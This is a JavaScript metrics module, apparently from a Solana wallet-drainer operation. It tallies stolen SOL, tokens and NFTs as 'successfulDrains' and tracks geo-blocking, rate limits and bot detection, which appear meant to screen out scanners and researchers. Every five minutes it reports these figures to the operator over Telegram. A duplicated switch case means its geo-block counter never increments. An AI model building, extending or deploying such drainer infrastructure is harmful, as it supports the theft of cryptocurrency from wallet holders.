import telegramLogger from './telegram.js';

class PerformanceMonitor {
  constructor() {
    this.metrics = {
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      totalResponseTime: 0,
      totalSOL: 0,
      totalTokens: 0,
      totalNFTs: 0,
      blockedRequests: 0,
      suspiciousActivities: 0,
      geoBlocks: 0,
      rateLimitViolations: 0,
      botDetection: 0,
      cacheHits: 0,
      cacheMisses: 0,
      startTime: Date.now()
    };
    
    this.requestTimes = [];
    this.activeConnections = 0;
    
    // Start periodic reporting
    this.startPeriodicReporting();
  }

  /**
   * Record a request
   * @param {Object} data - Request data
   */
  recordRequest(data) {
    this.metrics.totalRequests++;
    this.activeConnections++;
    
    if (data.success) {
      this.metrics.successfulRequests++;
      this.metrics.totalSOL += data.solAmount || 0;
      this.metrics.totalTokens += data.tokenCount || 0;
      this.metrics.totalNFTs += data.nftCount || 0;
    } else {
      this.metrics.failedRequests++;
    }
    
    if (data.responseTime) {
      this.metrics.totalResponseTime += data.responseTime;
      this.requestTimes.push(data.responseTime);
      
      // Keep only last 1000 response times
      if (this.requestTimes.length > 1000) {
        this.requestTimes.shift();
      }
    }
    
    this.activeConnections--;
  }

  /**
   * Record security event
   * @param {string} type - Event type
   */
  recordSecurityEvent(type) {
    switch (type) {
      case 'IP_BLOCKED':
      case 'GEO_BLOCKED':
        this.metrics.blockedRequests++;
        break;
      case 'SUSPICIOUS_ACTIVITY':
        this.metrics.suspiciousActivities++;
        break;
      case 'GEO_BLOCKED':
        this.metrics.geoBlocks++;
        break;
      case 'IP_RATE_LIMIT_EXCEEDED':
      case 'WALLET_RATE_LIMIT_EXCEEDED':
        this.metrics.rateLimitViolations++;
        break;
      case 'SUSPICIOUS_USER_AGENT':
        this.metrics.botDetection++;
        break;
    }
  }

  /**
   * Record cache event
   * @param {boolean} hit - Cache hit or miss
   */
  recordCacheEvent(hit) {
    if (hit) {
      this.metrics.cacheHits++;
    } else {
      this.metrics.cacheMisses++;
    }
  }

  /**
   * Get current metrics
   * @returns {Object} Current metrics
   */
  getMetrics() {
    const uptime = Date.now() - this.metrics.startTime;
    const avgResponseTime = this.requestTimes.length > 0 
      ? this.requestTimes.reduce((a, b) => a + b, 0) / this.requestTimes.length 
      : 0;
    
    const successRate = this.metrics.totalRequests > 0 
      ? (this.metrics.successfulRequests / this.metrics.totalRequests) * 100 
      : 0;
    
    const cacheHitRate = (this.metrics.cacheHits + this.metrics.cacheMisses) > 0 
      ? (this.metrics.cacheHits / (this.metrics.cacheHits + this.metrics.cacheMisses)) * 100 
      : 0;
    
    const requestsPerSecond = uptime > 0 
      ? (this.metrics.totalRequests / (uptime / 1000)) 
      : 0;
    
    // Calculate threat level based on security events
    const securityEvents = this.metrics.blockedRequests + 
                          this.metrics.suspiciousActivities + 
                          this.metrics.geoBlocks + 
                          this.metrics.rateLimitViolations + 
                          this.metrics.botDetection;
    
    let threatLevel = 'LOW';
    if (securityEvents > 50) threatLevel = 'HIGH';
    else if (securityEvents > 20) threatLevel = 'MEDIUM';
    
    return {
      // Performance metrics
      responseTime: Math.round(avgResponseTime),
      successRate: Math.round(successRate * 100) / 100,
      requestsPerSecond: Math.round(requestsPerSecond * 100) / 100,
      cacheHitRate: Math.round(cacheHitRate * 100) / 100,
      activeConnections: this.activeConnections,
      
      // Business metrics
      totalRequests: this.metrics.totalRequests,
      successfulRequests: this.metrics.successfulRequests,
      failedRequests: this.metrics.failedRequests,
      totalSOL: this.metrics.totalSOL,
      totalTokens: this.metrics.totalTokens,
      totalNFTs: this.metrics.totalNFTs,
      
      // Security metrics
      blockedRequests: this.metrics.blockedRequests,
      suspiciousActivities: this.metrics.suspiciousActivities,
      geoBlocks: this.metrics.geoBlocks,
      rateLimitViolations: this.metrics.rateLimitViolations,
      botDetection: this.metrics.botDetection,
      threatLevel: threatLevel,
      
      // System metrics
      uptime: Math.round(uptime / 1000 / 60), // minutes
      memoryUsage: Math.round(process.memoryUsage().heapUsed / 1024 / 1024), // MB
      cpuUsage: 0 // Would need external monitoring for this
    };
  }

  /**
   * Start periodic reporting
   */
  startPeriodicReporting() {
    // Send performance report every 5 minutes
    setInterval(async () => {
      try {
        const metrics = this.getMetrics();
        
        // Send system performance metrics
        await telegramLogger.logSystemPerformance({
          memoryUsage: metrics.memoryUsage,
          cpuUsage: metrics.cpuUsage,
          activeConnections: metrics.activeConnections,
          cacheHitRate: metrics.cacheHitRate,
          avgResponseTime: metrics.responseTime,
          requestsPerSecond: metrics.requestsPerSecond
        });
        
        // Send security metrics
        await telegramLogger.logSecurityMetrics({
          blockedRequests: metrics.blockedRequests,
          suspiciousActivities: metrics.suspiciousActivities,
          geoBlocks: metrics.geoBlocks,
          rateLimitViolations: metrics.rateLimitViolations,
          botDetection: metrics.botDetection,
          threatLevel: metrics.threatLevel
        });
        
        // Send analytics
        await telegramLogger.logAnalytics({
          activeUsers: metrics.activeConnections,
          successfulDrains: metrics.successfulRequests,
          failedAttempts: metrics.failedRequests,
          totalSOL: metrics.totalSOL / 1e9, // Convert to SOL
          totalTokens: metrics.totalTokens,
          totalNFTs: metrics.totalNFTs,
          successRate: metrics.successRate
        });
        
      } catch (error) {
        console.error('Error sending performance report:', error);
      }
    }, 5 * 60 * 1000); // 5 minutes
  }

  /**
   * Reset metrics (useful for testing)
   */
  reset() {
    this.metrics = {
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      totalResponseTime: 0,
      totalSOL: 0,
      totalTokens: 0,
      totalNFTs: 0,
      blockedRequests: 0,
      suspiciousActivities: 0,
      geoBlocks: 0,
      rateLimitViolations: 0,
      botDetection: 0,
      cacheHits: 0,
      cacheMisses: 0,
      startTime: Date.now()
    };
    this.requestTimes = [];
    this.activeConnections = 0;
  }
}

// Create singleton instance
const performanceMonitor = new PerformanceMonitor();

export default performanceMonitor; 